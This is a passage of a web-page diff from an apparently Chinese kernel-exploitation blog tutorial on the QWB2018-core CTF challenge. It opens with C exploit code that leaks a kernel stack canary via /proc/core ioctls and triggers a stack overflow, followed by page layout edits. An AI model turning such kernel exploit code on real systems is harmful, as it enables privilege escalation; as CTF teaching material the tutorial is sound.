i)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%hhx &quot;</span>, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与core_setoff交互的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setoff</span><span class="params">(<span class="type">int64_t</span> fd, <span class="type">int64_t</span> newoff)</span>&#123;</span><br><span class="line">    <span class="type">int</span> status = ioctl(fd, CORE_IOCTL_SETOFF, newoff);</span><br><span class="line">    <span class="keyword">if</span>(status)&#123;</span><br><span class="line">        log_error(<span class="string">&quot;setoff failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;setoff success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与core_write交互的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">int64_t</span> fd, <span class="type">uint8_t</span>* payload, <span class="type">size_t</span> size)</span>&#123;</span><br><span class="line">    <span class="type">int</span> status = write(fd, payload, size);</span><br><span class="line">    log_info_fmt(<span class="string">&quot;core_write: payload size: %ld&quot;</span>, size);</span><br><span class="line">    log_info_fmt(<span class="string">&quot;core_write: status: %d&quot;</span>, status);</span><br><span class="line">    log_success(<span class="string">&quot;core_write: payload write success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与core_copy_func交互的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int64_t</span> fd, <span class="type">uint64_t</span> copy_size)</span>&#123;</span><br><span class="line">    <span class="type">int</span> status = ioctl(fd, CORE_IOCTL_COPY, copy_size);</span><br><span class="line">    <span class="keyword">if</span>(status)&#123;</span><br><span class="line">        log_error(<span class="string">&quot;core_copy_func failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;core_copy_func success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span>&#123;</span><br><span class="line">    log_info(<span class="string">&quot;start exploiting...&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        log_error(<span class="string">&quot;open /proc/core failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;open /proc/core success&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LEAK Canary</span></span><br><span class="line">    <span class="type">uint8_t</span> buffer[USER_BUFF_SIZE];</span><br><span class="line">    setoff(fd, LEAK_OFF);</span><br><span class="line">    core_read(fd, buffer);</span><br><span class="line">    <span class="type">uint64_t</span> canary = *(<span class="type">uint64_t</span>*)(&amp;buffer[USER_BUFF_SIZE-LEAK_OFF]);</span><br><span class="line">    log_success_fmt(<span class="string">&quot;canary: %lx&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get ready for ROP</span></span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0x100</span>;</span><br><span class="line">    <span class="type">uint8_t</span> tmp[<span class="number">256</span>]=&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i+=<span class="number">8</span>)&#123;</span><br><span class="line">        *(<span class="type">uint64_t</span>*)(&amp;tmp[i]) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">64</span>; i&lt; <span class="number">0x100</span>; i+=<span class="number">8</span>)&#123;</span><br><span class="line">        *(<span class="type">uint64_t</span>*)(&amp;tmp[i]) = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    core_write(fd, tmp, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Stack Overflow</span></span><br><span class="line">    core_copy_func(fd,(<span class="number">-1</span> &amp; ~<span class="number">0xffff</span>) | <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    exploit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
+<img lazyload src="/images/loading.svg" data-src="/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/image-20260201171658314.png" class title="image-20260201171658314">
 
-
-
+<img lazyload src="/images/loading.svg" data-src="/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/image-20260201171841271.png" class title="image-20260201171841271">
 
 <p>接下来只需要构造<code>ROP</code>链即可</p>
 <h4 id="5-ROP-Chain"><a href="#5-ROP-Chain" class="headerlink" title="5.ROP-Chain"></a>5.<code>ROP-Chain</code></h4><p><code>vmlinux</code> 则是静态编译，未经过压缩的 kernel 文件。我们可以从 vmlinux 中找到一些 gadget，我们先把 gadget 保存下来备用。</p>
@@ -876,7 +888,7 @@
 
 
 
-
+<img lazyload src="/images/loading.svg" data-src="/2026/01/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%8C%EF%BC%89Kernel-ROP/image-20260202004912356.png" class title="image-20260202004912356">
 
 		</div>
 
@@ -884,14 +896,14 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> Linux-Kernel-PWN（二）Kernel ROP - 从QWB2018-core入门</li>
+        <li><strong>标题:</strong> [Linux-Kernel-PWN] Kernel ROP</li>
         <li><strong>作者:</strong> HackC0der</li>
         <li><strong>创建于
                 :</strong> 2026-01-18 15:16:29</li>
         
             <li>
                 <strong>更新于
-                    :</strong> 2026-02-02 00:49:33
+                    :</strong> 2026-02-14 10:25:11
             </li>
         
         <li>
@@ -914,17 +926,37 @@
 		
 
 		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux-Kernel-PWN/">#Linux Kernel PWN</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
 		
 
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/02/13/Github-Repos-microgpt/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">[Github-Repos] microgpt</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
 				<a class="next" rel="next" href="/2025/12/29/Linux-Kernel-PWN%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">Linux Kernel PWN （一）基础知识</span>
+						<span class="post-nav-title-item truncate max-w-48">[Linux-Kernel-PWN]Basic Knowledge</span>
 						<span class="post-nav-item">下一篇</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -938,47 +970,6 @@
 
 
 		
-		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-			<div class="comments-container mt-10 w-full ">
-    <div id="comment-anchor" class="w-full h-2.5"></div>
-    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        评论
-    </div>
-    
-
-        
-            
-    <div id="waline"></div>
-    <script type="module" data-swup-reload-script>
-      import { init } from '/js/libs/waline.mjs';
-
-      function loadWaline() {
-        init({
-          el: '#waline',
-          serverURL: 'https://example.example.com',
-          dark: 'body[class~="dark-mode"]',
-          reaction: false,
-          requiredMeta: ['nick', 'mail'],
-          emoji: [],
-                    lang: 'zh-CN',
-        });
-      }
-
-      if (typeof swup !== 'undefined') {
-        loadWaline();
-      } else {
-        window.addEventListener('DOMContentLoaded', loadWaline);
-      }
-    </script>
-
-
-
-        
-    
-</div>
-
-		</div>
-		
 	</div>
 
 	
@@ -986,7 +977,7 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
-		<div class="page-title">Linux-Kernel-PWN（二）Kernel ROP - 从QWB2018-core入门</div>
+		<div class="page-title">[Linux-Kernel-PWN] Kernel ROP</div>
 		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%8A%B6%E6%80%81%E4%BF%9D%E5%AD%98"><span class="nav-text">一、状态保存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%8A%B6%E6%80%81%E4%BF%9D%E5%AD%98"><span class="nav-text">二、状态保存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81QWB2018-core"><span class="nav-text">三、QWB2018 - core</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%86%85%E6%A0%B8%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8C%85"><span class="nav-text">（一）内核文件解包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97core-ko%E5%88%86%E6%9E%90"><span class="nav-text">（二）内核模块core.ko分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%86%85%E6%A0%B8EXP%E7%9A%84%E6%9D%BF%E5%AD%90"><span class="nav-text">（三）内核EXP的板子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89Exploit%E8%BF%87%E7%A8%8B"><span class="nav-text">（四）Exploit过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89%E6%9C%80%E7%BB%88EXP"><span class="nav-text">（五）最终EXP</span></a></li></ol></li></ol>
 
 	</div>
@@ -1014,11 +1005,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 5 篇文章
+                        共撰写了 6 篇文章
                     </span>
                     
                         <span>
-                            共 42.5k 字
+                            共 49.8k 字
                         </span>
                     
                 </p>
@@ -1087,10 +1078,6 @@
 		
 
 		<!-- go comment -->
-		
-		<li class="go-comment">
-			<i class="fa-regular fa-comments"></i>
-		</li>
 		
 	</ul>
 </div>
